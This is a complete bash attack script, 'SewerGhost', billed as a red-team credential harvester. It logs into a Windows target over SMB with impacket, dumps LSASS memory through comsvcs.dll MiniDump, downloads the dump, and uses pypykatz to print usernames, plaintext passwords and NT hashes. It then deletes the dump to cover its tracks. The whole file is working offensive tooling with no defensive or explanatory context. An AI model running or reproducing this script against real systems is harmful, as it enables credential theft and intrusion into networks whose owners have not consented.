#!/bin/bash
# ==============================================================================
# SewerGhost - Automated Credential Harvester (Native comsvcs.dll Edition)
# Author: Red Team
# Goal: Get passwords from LSASS dump via built-in Windows tools
# ==============================================================================

TARGET_IP=$1
SMB_USER=$2
SMB_PASS=$3

if [ -z "$TARGET_IP" ] || [ -z "$SMB_USER" ] || [ -z "$SMB_PASS" ]; then
    echo "Usage: ./run.sh <IP> <User> <Pass>"
    exit 1
fi

DUMP_PATH="C:\\Windows\\Temp\\lsass.dmp"
LOCAL_DMP="lsass.dmp"

echo "[*] --- SewerGhost Credential Harvester ---"
echo "[*] Target: $TARGET_IP"
echo ""

# Phase 1: Dump LSASS via built-in comsvcs.dll (runs as SYSTEM, no custom exe)
echo "[*] Phase 1: Dumping LSASS memory..."
impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP -c "powershell -c \"\\\$pid=(Get-Process lsass).Id; rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump \\\$pid $DUMP_PATH full\"" 2>/dev/null
sleep 2

# Phase 2: Retrieve the dump file
echo "[*] Phase 2: Retrieving dump from target..."
echo "get C:\\Windows\\Temp\\lsass.dmp $LOCAL_DMP" | impacket-smbclient -U "$SMB_USER%$SMB_PASS" "//$TARGET_IP/c\$" 2>/dev/null

if [ ! -f "$LOCAL_DMP" ]; then
    echo "[-] ERROR: Failed to retrieve dump!"
    exit 1
fi

echo "[+] Retrieved: $LOCAL_DMP ($(stat -c%s $LOCAL_DMP 2>/dev/null || echo '?') bytes)"
echo ""

# Phase 3: Extract credentials using pypykatz
echo "[*] Phase 3: Extracting credentials from dump..."
python3 << 'PYTHON_EOF'
import sys
try:
    from pypykatz.lsass import lsass_dumper
    
    print("[*] Parsing LSASS minidump...")
    mimi = lsass_dumper.parse_minidump_file("lsass.dmp")
    
    print("[+] Successfully parsed!")
    print("\n" + "="*70)
    print("EXTRACTED CREDENTIALS")
    print("="*70)
    
    found_creds = False
    for sess_id, logon_sess in mimi.logon_sessions.items():
        for cred in logon_sess.credentials:
            if cred.password or cred.nthash:
                found_creds = True
                if cred.username:
                    print(f"\n  Username: {cred.username}")
                if cred.domain:
                    print(f"  Domain:   {cred.domain}")
                if cred.password:
                    print(f"  Password: {cred.password}")
                if cred.nthash:
                    print(f"  NT Hash:  {cred.nthash.hex()}")
    
    if not found_creds:
        print("\n[!] No plaintext passwords found (may need NTLM hashes)")
        print("[*] Showing all sessions for reference:")
        for sess_id, logon_sess in mimi.logon_sessions.items():
            for cred in logon_sess.credentials:
                if cred.username:
                    print(f"    - {cred.username} ({cred.domain})")
    
    print("\n" + "="*70)
    
except Exception as e:
    print(f"[-] Error: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)
PYTHON_EOF

# Phase 4: Optional cleanup on target
echo ""
echo "[*] Phase 4: Cleaning up target..."
impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP -c "del $DUMP_PATH 2>nul" 2>/dev/null
echo "[+] Done!"